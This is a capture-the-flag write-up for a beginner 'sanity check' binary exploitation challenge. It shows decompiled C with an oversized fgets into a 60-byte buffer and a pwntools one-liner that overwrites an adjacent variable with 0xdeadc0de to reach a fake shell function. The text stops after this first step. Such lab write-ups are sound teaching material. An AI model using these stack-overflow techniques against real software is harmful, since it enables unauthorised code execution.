This was a sanity check challenge for the PWN category. 

We were provided a 64-bit ELF file containing the following functions:

vuln():
```c
void vuln(void)

{
  char local_48 [60];
  int local_c;
  
  puts("tell me a joke");
  fgets(local_48,0x100,stdin);
  if (local_c == -0x21523f22) {
    puts("very good, here is a shell for you. ");
    shell();
  }
  else {
    puts("will this work?");
  }
  return;
}
```

shell():
```c
void shell(void)

{
  puts("spawning /bin/sh process");
  puts("wush!");
  printf("$> ");
  puts("If this is not good enough, you will just have to try harder :)");
  return;
}
```

win():
```c
void win(int param_1,int param_2)

{
  puts("you made it to win land, no free handouts this time, try harder");
  if (param_1 == -0x21524111) {
    puts("one down, one to go!");
    if (param_2 == 0x1337c0de) {
      puts("2/2 bro good job");
      system("/bin/sh");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  }
  return;
}
```

I initially attempted a variable overwrite in order to reach the shell() function. Specially, I overwrote `local_c` so that it would equal `-0x21523f22` (which is equivalent to `0xdeadc0de`)


```console
root@osboxes:~/Downloads# python -c 'from pwn import *;print "A" * 60 + p64(0xdeadc0de)' | ./pwn_sanity_check 
tell me a joke
very good, here is a shell for you. 
spawning /bin/sh process
wush!
$> If this is not good enough, you will just have to try harder :)
```
